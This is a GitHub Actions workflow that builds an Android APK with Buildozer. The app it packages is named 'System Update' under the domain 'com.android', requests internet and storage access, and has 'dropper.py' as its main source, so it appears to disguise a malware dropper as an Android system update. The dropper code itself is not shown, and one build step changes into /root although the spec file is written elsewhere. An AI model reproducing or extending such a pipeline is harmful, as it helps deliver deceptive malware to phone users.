name: Build APK

on:
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.10'

      - name: Install system dependencies
        run: |
          sudo apt-get update
          sudo apt-get install -y \
            git zlib1g-dev libffi-dev libssl-dev \
            build-essential libtool m4 autoconf automake \
            pkg-config libltdl-dev libltdl7 cython3
          
          # Verify installations
          which libtool
          libtool --version

      - name: Upgrade pip and install Python dependencies
        run: |
          python -m pip install --upgrade pip setuptools wheel
          pip install buildozer cython Pillow requests urllib3

      - name: Create buildozer.spec
        run: |
          cat > buildozer.spec << 'EOF'
          [app]
          title = System Update
          package.name = systemupdate
          package.domain = com.android
          source.main = dropper.py
          version = 0.1
          requirements = python3,requests,urllib3,android
          permissions = INTERNET,WRITE_EXTERNAL_STORAGE,READ_EXTERNAL_STORAGE
          features = android.hardware.usb.host
          
          [buildozer]
          log_level = 2
          
          [app:permissions]
          
          [app:permissions:android]
          android.accept_sdk_license = True
          android.api = 33
          android.minapi = 24
          android.ndk = 27.3.13750724
          android.archs = arm64-v8a,armeabi-v7a
          p4a.hook = hooks.py
          EOF

      - name: Build APK with Buildozer
        run: |
          cd /root
          buildozer android debug 2>&1 | tee build.log
        continue-on-error: false

      - name: Upload APK artifact
        if: success()
        uses: actions/upload-artifact@v4
        with:
          name: systemupdate-apk
          path: bin/*.apk
          retention-days: 30

      - name: Upload build logs
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: build-logs
          path: |
            build.log
            .buildozer/
          retention-days: 7
